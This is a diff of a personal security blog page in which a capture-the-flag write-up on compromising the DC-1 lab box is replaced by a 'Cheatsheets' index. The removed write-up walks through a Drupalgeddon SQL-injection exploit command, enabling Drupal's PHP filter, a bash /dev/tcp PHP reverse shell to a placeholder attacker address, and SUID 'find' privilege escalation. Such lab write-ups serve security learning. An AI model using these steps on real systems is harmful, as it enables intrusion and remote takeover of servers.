@@ -6,14 +6,11 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
   <meta name="generator" content="Hugo 0.92.2" />
-  <link rel="canonical" href="https://1d8.github.io/writeups/provinggrounds/dc-1/" />
+  <link rel="canonical" href="https://1d8.github.io/cheatsheets/" />
 
   
     
-    <meta name="description" content="Despite the name, this is not a Domain Controller and is indeed a Linux box!
-Starting off with a quick nmap scan of the box:
-We see 3 services running on the box:
- 22 - SSH 80 - HTTP 111 - RPCBind  What really caught my attention was port 80 since it’s running Drupal, which is an open-source Content Management System (CMS) and nmap is telling us that it’s running version 7 of Drupal which has an SQL injection vulnerability that was dubbed Drupalgeddon!">
+    <meta name="description" content="Cheatsheets">
   
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://1d8.github.io/apple-touch-icon.png">
@@ -63,7 +60,7 @@ We see 3 services running on the box:
 
   
   
-  <title>DC-1 Writeup | </title>
+  <title>Cheatsheets | </title>
 </head>
 
   <body>
@@ -202,7 +199,7 @@ We see 3 services running on the box:
       
       
       
-      <a href="/cheatsheets/" >
+      <a href="/cheatsheets/" aria-current="page">
         <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
           <use href="#bookmark"></use>
         </svg>
@@ -258,61 +255,36 @@ We see 3 services running on the box:
       <div class="main-and-footer">
         <div>
           
-  <main id="main">
-    <h1>DC-1 Writeup</h1>
-    <p>Despite the name, this is not a Domain Controller and is indeed a Linux box!</p>
-<p>Starting off with a quick <code>nmap</code> scan of the box:</p>
-<p><img src="https://i.imgur.com/AmKH43e.png" alt=""></p>
-<p>We see 3 services running on the box:</p>
-<ul>
-<li><code>22</code> - SSH</li>
-<li><code>80</code> - HTTP</li>
-<li><code>111</code> - RPCBind</li>
-</ul>
-<p>What really caught my attention was port <code>80</code> since it&rsquo;s running <code>Drupal</code>, which is an open-source <em>Content Management System (CMS)</em> and <code>nmap</code> is telling us that it&rsquo;s running version 7 of Drupal which has an SQL injection vulnerability that was dubbed <code>Drupalgeddon</code>!</p>
-<p>Exploiting this SQL injection can lead to us adding a new admin user to the CMS which we could abuse to get an initial shell foothold on the host! I used a Python script to exploit this SQL vulnerability which can be <a href="https://www.exploit-db.com/exploits/34992">found here</a>:
-<em>NOTE: This Python exploit is written in Python 2, so you&rsquo;ll need that downloaded in order to run it successfully!</em></p>
-<p><code>python2 drupalexploit.py -t http://192.168.217.193 -u 1d8 -p password</code>:</p>
-<p><img src="https://i.imgur.com/hwigLwm.png" alt=""></p>
-<p><img src="https://i.imgur.com/9AaZsJh.png" alt=""></p>
-<p>And we&rsquo;re able to login to the Drupal instance! If we take a look at our <strong>Roles</strong>, we&rsquo;ll see that we&rsquo;re <strong>administrators</strong>:</p>
-<p><img src="https://i.imgur.com/zbjyoMx.png" alt=""></p>
-<p>Fantastic! Now let&rsquo;s get a shell!</p>
-<p>According to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal">HackTricks</a>, we can get RCE on a Drupal instance by using the <strong>PHP Filter Module</strong>. Let&rsquo;s go to modules &gt; PHP filter &gt; Checkmark it &gt; save configuration!</p>
-<p>After that, go to modules &gt; PHP Filter &gt; Permissions &gt; set <strong>the Use PHP Code text format</strong> filter to be allowed by Administrators, then save these permissions:</p>
-<p><img src="https://i.imgur.com/nSNiWsr.png" alt=""></p>
-<p>Now we can create a new page on the Drupal instance &amp; set the text format to be PHP code &amp; have the server execute any PHP code that we want!</p>
-<p>Go to content &gt; Add Content &gt; Choose either basic page or article &gt; Give the new page a title &amp; insert a PHP reverse shell into the body &gt; Set the text format to be <strong>PHP Code</strong>:</p>
-<p><img src="https://i.imgur.com/VXLGTAk.png" alt=""></p>
-<ul>
-<li>I chose to use the following PHP reverse shell:  <code>&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;Attacker IP Address&gt;/&lt;Attacker Port&gt; 0&gt;&amp;1'&quot;);?&gt;</code></li>
-</ul>
-<p>On your attacker host, you can run <code>nc -lvnp &lt;port&gt;</code>, I&rsquo;ll be using <a href="https://github.com/calebstewart/pwncat">pwncat</a> so in this case, I ran: <code>pwncat-cs -lp &lt;port&gt;</code> to start the listening port.</p>
-<p>After the listening port has been setup, click <strong>Save</strong> on the Drupal instance &amp; you should get a connection:</p>
-<p><img src="https://i.imgur.com/d33oC1d.png" alt=""></p>
-<p>Let&rsquo;s get onto the <strong>privilege escalation</strong> portion!</p>
-<h1 id="privilege-escalation">Privilege Escalation</h1>
-<p>We can start by running good ol' <code>LinPeas.sh</code>. Since I&rsquo;m using <code>pwncat</code>, I just need to run <code>upload linpeas.sh</code> &amp; ensure I&rsquo;m in the same directory that the file is located in to upload it to the target host.</p>
-<p>If you aren&rsquo;t using <code>linpeas</code>, starting up a simple python3 web server &amp; <code>wget</code> will do just fine though!</p>
-<p>After <code>linpeas.sh</code> has finished running, you&rsquo;ll notice that under the <code>SUID</code> section, it found that the <code>find</code> command had the <code>SUID</code> bit set. All this means is we&rsquo;re able to run certain binaries using an elevated users' permissions. For us, this means potential privilege escalation:</p>
-<p><img src="https://i.imgur.com/oHkNiMO.png" alt=""></p>
-<p>We can cross-reference this with <a href="https://gtfobins.github.io/gtfobins/find/">GTFOBins</a> to attempt to find any reference to the <code>find</code> binary being used for privilege escalation:</p>
-<p><img src="https://i.imgur.com/JjB5xW6.png" alt=""></p>
-<p>And we got it! Let&rsquo;s run this command:</p>
-<p><img src="https://i.imgur.com/JLmcIAj.png" alt=""></p>
-<p>Notice how it still says the UID is 33 which is <code>www-data</code> so this low privilege user still owns the process, though the process still has the full permissions that are granted to the <code>root</code> user, even though the process isn&rsquo;t owned by <code>root</code>! That&rsquo;s the magic of SUID bits!</p>
-<p>One more thing to mention, <code>pwncat</code> has a module that can be used for automated privilege escalation named <code>escalate</code>, unfortunately though, it didn&rsquo;t seem to find the SUID bit for the <code>find</code> binary as an escalation path:</p>
-<p><img src="https://i.imgur.com/fKQbIKF.png" alt=""></p>
-<p>Though, when using the <code>enumerate.file.suid</code> module, it was able to discover that the <code>find</code> binary&rsquo;s SUID bit was set:</p>
-<p><img src="https://i.imgur.com/IH6qHuV.png" alt=""></p>
-<h1 id="references">References</h1>
-<ul>
-<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal</a></li>
-<li><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></li>
-<li><a href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a></li>
-</ul>
-
-  </main>
+<main id="main">
+  <h1>Cheatsheets</h1>
+  
+  <input
+    id="search"
+    type="text"
+    placeholder="Search by title..."
+    aria-label="Search by title"
+  />
+  
+  <ul class="patterns-list" id="list">
+    
+    <li>
+      <h2>
+        <a href="/cheatsheets/adbasics/">
+          <svg
+            class="bookmark"
+            aria-hidden="true"
+            viewBox="0 0 40 50"
+            focusable="false"
+          >
+            <use href="#bookmark"></use>
+          </svg>
+          Active Directory (AD) Basics
+        </a>
+      </h2>
+    </li>
+    
+  </ul>
+</main>
 
           
             <footer role="contentinfo">
